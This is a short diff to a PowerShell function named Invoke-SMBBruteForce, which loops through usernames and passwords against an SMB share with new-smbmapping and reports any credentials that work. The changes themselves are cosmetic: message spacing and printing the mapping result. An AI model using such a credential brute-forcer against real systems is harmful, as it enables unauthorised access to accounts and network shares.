@@ -75,7 +75,7 @@ function Invoke-SMBBruteForce
         $Counter = 0
         Write-Host "[*]Trying to authenticate against \\$target"
 
-        Write-Host "[*] Starting Brute Force Operation"
+        Write-Host "[*]Starting Brute Force Operation"
             if(!$Username)
             {
                 $UserFileLength = (Get-Content $UsernameFile).Length
@@ -108,7 +108,8 @@ function Invoke-SMBBruteForce
                         {
                             try
                             {
-                                $valid = new-smbmapping -remotepath \\$target -username $u -password $pw 
+                                $valid = new-smbmapping -remotepath \\$target -username $u -password $pw
+                                $valid
                                 if($valid)
                                 {
                                 write-host "[*]Success! Password for $u is $pw"
